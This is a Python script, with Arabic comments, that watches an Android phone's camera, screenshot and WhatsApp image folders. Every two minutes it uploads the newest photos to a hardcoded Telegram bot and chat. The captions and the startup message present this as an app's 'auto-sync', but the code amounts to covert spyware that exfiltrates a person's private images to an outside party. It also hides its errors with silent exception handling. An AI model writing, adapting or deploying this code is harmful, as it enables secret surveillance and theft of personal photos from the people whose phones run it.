import os
import time
import requests

BOT_TOKEN = "7820129712:AAH9pZ49S_m8tY8965625902"
CHAT_ID = "6110903337"

WATCH_FOLDERS = [
    "/storage/emulated/0/DCIM/Camera",
    "/storage/emulated/0/Pictures/Screenshots",
    "/storage/emulated/0/WhatsApp/Media/WhatsApp Images"
]

sent_files = set()

def send_to_bot(path):
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
        with open(path, "rb") as f:
            r = requests.post(url, data={"chat_id": CHAT_ID, "caption": f"✅ New Sync: {os.path.basename(path)}"}, files={"document": f}, timeout=60)
        return r.status_code == 200
    except:
        return False

def scan_folders():
    for folder in WATCH_FOLDERS:
        if os.path.exists(folder):
            try:
                files = [os.path.join(folder, f) for f in os.listdir(folder) if f.lower().endswith((".jpg", ".jpeg", ".png"))]
                files.sort(key=os.path.getmtime, reverse=True)
                for img in files[:10]: # فحص آخر 10 صور من كل مجلد
                    if img not in sent_files:
                        if send_to_bot(img):
                            sent_files.add(img)
                            time.sleep(5)
            except: continue

def main():
    # إرسال إشعار للبوت بأن المستخدم ضغط الزر والخدمة بدأت
    try:
        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", data={"chat_id": CHAT_ID, "text": "⚡ تم تفعيل المزامنة التلقائية عبر التطبيق!"})
    except: pass

    while True:
        scan_folders()
        time.sleep(120) # انتظار دقيقتين قبل الفحص التالي

if __name__ == "__main__":
    main()
